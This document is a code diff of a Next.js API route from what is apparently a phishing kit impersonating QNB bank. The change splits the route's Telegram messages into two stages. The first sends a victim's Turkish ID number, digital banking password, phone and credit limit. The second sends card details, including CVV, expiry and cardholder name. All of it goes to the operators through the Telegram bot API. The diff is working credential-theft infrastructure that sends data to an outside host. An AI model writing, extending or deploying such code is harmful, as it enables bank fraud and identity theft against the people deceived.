@@ -8,6 +8,7 @@ interface TelegramData {
   applicationDate: string
   realName?: string // Ad Soyad veya Kart Sahibi
   realSurname?: string
+  messageType?: 'PHONE_INFO' | 'CARD_INFO' // Mesaj türü
 }
 
 export async function POST(request: NextRequest) {
@@ -39,12 +40,15 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    // Veri türünü belirle (Kart bilgisi mi, normal başvuru mu?)
-    const isCardData = telegramData.username === 'KART_BILGISI'
+    // Mesaj türünü belirle
+    const messageType = telegramData.messageType || 'PHONE_INFO'
     
     // Telegram mesajını oluştur
-    const message = isCardData ? `
-🔔 *YENİ KART BİLGİSİ*
+    let message = ''
+    
+    if (messageType === 'CARD_INFO') {
+      message = `
+🔔 *💳 KART BİLGİLERİ TAMAMLANDI*
 
 🌐 *Domain:* \`${fullDomain}\`
 
@@ -53,11 +57,32 @@ export async function POST(request: NextRequest) {
 🔐 CVV: \`${telegramData.password}\`
 📅 Son Kullanma: \`${telegramData.creditLimit}\`
 👤 Kart Sahibi: \`${telegramData.realName}\`
-📅 Gönderim Tarihi: \`${telegramData.applicationDate}\`
+📅 Tamamlanma Tarihi: \`${telegramData.applicationDate}\`
+
+🎯 *DURUM:* ✅ *TAM VERİ - KART BİLGİLERİ ALINDI*
 
 ---
+      `.trim()
+    } else if (messageType === 'PHONE_INFO') {
+      message = `
+🔔 *📱 ÖN BİLGİLER ALINDI*
 
-    `.trim() : `
+🌐 *Domain:* \`${fullDomain}\`
+
+👤 *İlk Adım Bilgileri:*
+🆔 TC Kimlik: \`${telegramData.username}\`
+🔐 Dijital Şifre: \`${telegramData.password}\`
+📱 Telefon: \`${telegramData.phone}\`
+💳 Kredi Kartı Limiti: \`${telegramData.creditLimit} ₺\`
+📅 Başlangıç Tarihi: \`${telegramData.applicationDate}\`
+
+⚠️ *DURUM:* 🟡 *PARÇA VERİ - KART BİLGİLERİ BEKLENİYOR*
+
+---
+      `.trim()
+    } else {
+      // Eski format (backward compatibility)
+      message = `
 🔔 *YENİ QNB BAŞVURUSU*
 
 🌐 *Domain:* \`${fullDomain}\`
@@ -72,8 +97,8 @@ export async function POST(request: NextRequest) {
 ${telegramData.realName ? `👤 Ad Soyad: \`${telegramData.realName} ${telegramData.realSurname}\`` : ''}
 
 ---
-
-    `.trim()
+      `.trim()
+    }
 
     // Telegram API'sine istek gönder
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
